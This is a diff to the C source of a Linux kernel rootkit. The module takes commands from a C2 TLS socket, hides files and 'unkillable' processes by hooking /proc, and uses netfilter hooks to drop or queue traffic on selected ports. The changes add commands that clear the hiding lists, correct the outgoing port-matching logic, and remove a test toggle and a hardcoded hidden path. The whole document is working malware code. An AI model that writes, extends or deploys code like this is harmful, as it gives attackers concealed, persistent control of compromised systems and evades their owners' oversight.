@@ -321,6 +321,8 @@ void read_TLS(struct work_struct* work) {
     const char* clear = "All port settings cleared\n";
     const char* bad_drop = "Unable to close the C2 port\n";
     const char* bad_file = "Invalid hidden file path\n";
+    const char* clearf = "All file hiding cleared\n";
+    const char* clearp = "All unkillable proc hiding cleared\n";
 
     memset(buffer, 0, MAX_PAYLOAD);
     len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
@@ -361,18 +363,22 @@ void read_TLS(struct work_struct* work) {
         buffer[0] = 'm';
         strcpy(buffer + 1, close);
         send_msg(svc->tls_socket, buffer, strlen(close) + 1);
+    } else if (memcmp("clearf", buffer, 6) == 0) {
+        hidden_file_count = 0;
+        buffer[0] = 'm';
+        strcpy(buffer + 1, clearf);
+        send_msg(svc->tls_socket, buffer, strlen(clearf) + 1);
+    } else if (memcmp("clearp", buffer, 6) == 0) {
+        hidden_kill_count = 0;
+        buffer[0] = 'm';
+        strcpy(buffer + 1, clearp);
+        send_msg(svc->tls_socket, buffer, strlen(clearp) + 1);
     } else if (memcmp("clear", buffer, 5) == 0) {
         open_port_count = 0;
         closed_port_count = 0;
         buffer[0] = 'm';
         strcpy(buffer + 1, clear);
         send_msg(svc->tls_socket, buffer, strlen(clear) + 1);
-    } else if (memcmp("test", buffer, 4) == 0) {
-        if (hidden) {
-            show();
-        } else {
-            hide();
-        }
     } else if (memcmp("kill", buffer, 4) == 0) {
         printk(KERN_INFO "Killswitch engaged\n");
         show();
@@ -480,7 +486,6 @@ unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 
     if (ip_header->protocol == IPPROTO_TCP) {
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
-
         for (i = 0; i < closed_port_count; ++i) {
             if (ntohs(tcp_header->dest) == closed_ports[i]) {
                 return NF_DROP;
@@ -532,26 +537,25 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 
     if (ip_header->protocol == IPPROTO_TCP) {
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
-
         for (i = 0; i < closed_port_count; ++i) {
-            if (ntohs(tcp_header->source) == closed_ports[i]) {
+            if (ntohs(tcp_header->dest) == closed_ports[i]) {
                 return NF_DROP;
             }
         }
         for (i = 0; i < open_port_count; ++i) {
-            if (ntohs(tcp_header->source) == open_ports[i]) {
+            if (ntohs(tcp_header->dest) == open_ports[i]) {
                 return NF_QUEUE;
             }
         }
     } else if (ip_header->protocol == IPPROTO_UDP) {
         udp_header = (struct udphdr*) skb_transport_header(skb);
         for (i = 0; i < closed_port_count; ++i) {
-            if (ntohs(udp_header->source) == closed_ports[i]) {
+            if (ntohs(udp_header->dest) == closed_ports[i]) {
                 return NF_DROP;
             }
         }
         for (i = 0; i < open_port_count; ++i) {
-            if (ntohs(udp_header->source) == open_ports[i]) {
+            if (ntohs(udp_header->dest) == open_ports[i]) {
                 return NF_QUEUE;
             }
         }
@@ -744,7 +748,6 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
  * notes:
  * Module entry function
  */
-char parent_name[PATH_MAX];
 static int __init mod_init(void) {
     int err;
 
@@ -761,11 +764,6 @@ static int __init mod_init(void) {
     backup_proc_fops = (struct file_operations*) proc_inode->i_fop;
     proc_fops.iterate_shared = proc_iterate_shared;
     proc_inode->i_fop = &proc_fops;
-
-    const char* user_input = "/aing-matrix";
-    if (hide_file(user_input, hidden_files + hidden_file_count)) {
-        ++hidden_file_count;
-    }
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
